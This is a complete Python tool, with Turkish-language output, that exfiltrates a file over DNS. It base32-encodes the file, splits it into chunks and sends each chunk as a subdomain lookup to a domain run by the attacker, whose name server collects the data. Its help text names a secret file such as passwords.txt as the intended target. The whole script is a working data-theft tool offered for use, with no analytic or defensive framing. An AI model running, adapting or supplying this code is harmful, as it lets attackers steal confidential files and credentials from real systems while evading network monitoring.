import sys
import base64
import socket
import time
import argparse
import random

def exfiltrate_dns(file_path, domain):
    try:
        with open(file_path, "rb") as f:
            data = f.read()
    except Exception as e:
        print(f"[!] Dosya okuma hatasi: {e}")
        return False

    # Base32 is DNS safe (case insensitive, alphanumeric)
    encoded = base64.b32encode(data).decode('utf-8').replace('=', '')
    chunk_size = 50
    chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
    
    session_id = random.randint(1000, 9999)
    total_chunks = len(chunks)
    
    print(f"[*] DNS Exfiltration Baslatiliyor (Session: {session_id})")
    print(f"[*] Toplam {total_chunks} paket gonderilecek (Hedef: {domain})")

    for i, chunk in enumerate(chunks):
        # Format: <chunk>.<index>.<total>.<session>.<domain>
        subdomain = f"{chunk}.{i}.{total_chunks}.{session_id}.{domain}"
        
        print(f"[+] Gonderiliyor ({i+1}/{total_chunks}): {subdomain}")
        try:
            # We just do a standard DNS lookup. It doesn't matter if it resolves,
            # the query will hit the authoritative name server (our listener).
            socket.gethostbyname(subdomain)
        except Exception:
            pass # Ignore resolution errors
            
        time.sleep(0.5) # Prevent flooding

    print("[*] Sızdırma islemi tamamlandi.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DNS Tunneling Data Exfiltrator")
    parser.add_argument("-f", "--file", help="Sızdırılacak gizli dosya (örn: passwords.txt)", required=True)
    parser.add_argument("-d", "--domain", help="Saldirgana ait alan adi (örn: attacker.com)", required=True)
    args = parser.parse_args()

    exfiltrate_dns(args.file, args.domain)
